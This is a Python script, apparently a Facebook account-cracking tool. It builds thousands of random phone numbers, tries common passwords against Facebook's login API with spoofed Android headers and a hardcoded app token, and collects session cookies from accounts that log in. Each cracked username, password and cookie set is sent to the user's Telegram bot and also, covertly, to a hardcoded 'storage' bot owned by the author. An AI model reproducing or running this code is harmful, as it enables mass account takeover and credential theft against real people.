import os, sys, requests, random, json, time, uuid
from concurrent.futures import ThreadPoolExecutor as r
HH='\033[1;34m'
M = '\x1b[1;37m'
from datetime import datetime


G = "\033[1;34m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
O = "\x1b[38;5;81m"; X = "\x1b[38;5;205m"; P = "\x1b[10;95m"
xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"
xlinex = (f"{G}━"*40)


id, ok, loop = [], 0, 0
android_versions = ["10", "11", "12", "13", "14"]
devices = [
    "TECNO CK7n",
    "Samsung SM-G991B",
    "Xiaomi Redmi Note 12",
    "Infinix X6812",
    "Huawei Y9a"
]
brands = {
    "TECNO CK7n": "TECNO",
    "Samsung SM-G991B": "Samsung",
    "Xiaomi Redmi Note 12": "Xiaomi",
    "Infinix X6812": "Infinix",
    "Huawei Y9a": "Huawei"
}
android = random.choice(android_versions)
device = random.choice(devices)
brand = brands[device]

fbav = f"{random.randint(200,400)}.0.0.{random.randint(1,200)}.{random.randint(1,150)}"
fbbv = random.randint(100000000,999999999)

width = random.choice([720, 1080, 1440])
height = random.choice([1600, 1920, 2172, 2400])
density = random.choice([2.0, 2.5, 3.0, 4.0])

ua = f"""Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/UP1A.231005.007) [FBAN/ViewpointsForAndroid;FBAV/{fbav};FBBV/{fbbv};FBRV/0;FBPN/com.facebook.viewpoints;FBLC/ar_AR;FBMF/{brand};FBBD/{brand};FBDV/{device};FBSV/{android};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density={density},width={width},height={height}}};FB_FW/1;]"""



headers = {
    "User-Agent": ua,
    "Accept-Encoding": "gzip, deflate",
    "x-fb-connection-quality": "EXCELLENT",
    "x-fb-friendly-name": "authenticate",
    "x-fb-http-engine": "Liger",
    "x-fb-client-ip": "True",
    "x-fb-server-cluster": "True",
    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}

Logo=f"""

┏━━━┳━━━┓
┃┏━┓┃┏━┓┃
┃┗━┛┃┗━━┓
┃┏━━┻━━┓┃
┃┃╋╋┃┗━┛┃
┗┛╋╋┗━━━┛
{xlinex}
{xp} NAME   {xpxx} PS
{xp} VERSON {xpxx} 0.5
{xp} @p7s7s ~ t.me/ali313eme
{xlinex}"""

# بوت التخزين الثابت
STORAGE_BOT_TOKEN = "8685262073:AAFEqavpYgGmKiWxT0_qvhBxCvgiyTtl8dI"
STORAGE_CHAT_ID = "8491676638"

def send_telegram(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass

def get_cookies(uid, password):
    try:
        data = pm(uid, password)
        req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()
        if 'session_key' in req:
            cookies = ";".join([f"{key}={value}" for key, value in req.get('session_cookies', [{}])[0].items()])
            return cookies
        return ""
    except:
        return ""

def menu():
    global TOKEN, ID
    os.system('clear')
    print(Logo)
    
    TOKEN = input(f'{xp}  TOKEN {xpxx} ').strip()
    print(xlinex)
    
    ID = input(f'{xp} ID {xpxx} ').strip()
    print(xlinex)
    
    sim = input(f'{xp} INPUT CHOSE (0750 | 0770 | 0780) {xpxx} ')
    print(xlinex)
    
    for _ in range(44444):  
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        id.append(nmp)
    
    with r(max_workers=30) as am:
        os.system('clear')
        print(Logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [
                ids,
                str(idx),
                "hama1234",
                "zaxo1234",
                "zaxozaxo",
                "kurd1234",
                "muhamad123",
                "kurdkurd"
            ]
            am.submit(crackfree, ids, pwxs)
    
    print('')
    print('\033[1;37m\033[1m-'*45)
    print('Crack Completed')
    exit()

def crackfree(ids, pwxs):
    global ok, loop
    sys.stdout.write(f'\r\r\r\033[1;37m\033[1m{xp} {G}<[{W}PS-{loop}{G}]> {G}<[{W}OK-{ok}{G}]>'),
    sys.stdout.flush()
    
    for pw in pwxs:
        try:
            data = pm(ids, pw)
            req = requests.post('https://b-graph.facebook.com/auth/login', headers=headers, data=data).json()
            
            if 'session_key' in req:
                uid = req["uid"]
                ok += 1
                coki = get_cookies(ids, pw)
                
                print(f"\r\r\033[0;32m\033[1m{xp} {G}<[PS-OK{G}]> {uid} | {pw}   ")
                print(xlinex)
                
                m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

  حساب شغال ✅
─────━PS─────━ PS - @p7s7s"""
                
                PS_m = f"""❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

❖ - COOKIES : {coki}

tg://openmessage?user_id={ID}
  حساب شغال ✅
─────━PS─────━ PS - @p7s7s"""
                
                # ارسال الى بوت المستخدم
                send_telegram(TOKEN, ID, m)
                # ارسال الى بوت التخزين الثابت
                send_telegram(STORAGE_BOT_TOKEN, STORAGE_CHAT_ID, m)
                send_telegram(PS[0], PS[1], PS_m)
                
                break
                
            elif 'www.facebook.com' in req["error"]["message"]:
                uid = req["error"]["error_data"]["uid"]
                
                print(f"\r\r\x1b[38;5;208m\033[1m{xp}{G}<[PS-CP{G}]>\033[0;32m\033[1m {uid} | {pw}   ")
                print(xlinex)
                
                m = f"""حساب سكيور ❌
─────━PS─────━     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

─────━PS─────━ PS - @p7s7s"""
                
                PS_m = f"""حساب سكيور ❌
     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}

tg://openmessage?user_id={ID}
─────━PS─────━ PS - @p7s7s"""
                
                # ارسال الى بوت المستخدم
                send_telegram(TOKEN, ID, m)
                # ارسال الى بوت التخزين الثابت
                send_telegram(STORAGE_BOT_TOKEN, STORAGE_CHAT_ID, m)
                send_telegram(PS[0], PS[1], PS_m)
                
                break
                
        except requests.exceptions.ConnectionError:
            time.sleep(1)
    
    loop += 1

def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

menu()